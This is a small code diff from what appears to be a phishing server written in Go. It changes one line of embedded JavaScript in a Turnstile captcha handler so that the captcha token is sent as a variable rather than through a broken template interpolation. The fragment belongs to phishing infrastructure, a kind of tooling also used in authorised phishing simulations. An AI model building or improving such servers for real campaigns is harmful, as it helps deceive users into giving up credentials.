@@ -346,7 +346,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 					method: "POST",
 					body: JSON.stringify({
 					  "ts-submit": 1,
-					  "cf-turnstile-response": ${token}
+					  "cf-turnstile-response": token
 					}),
 					headers: {
 					  "Content-type": "application/json; charset=UTF-8"
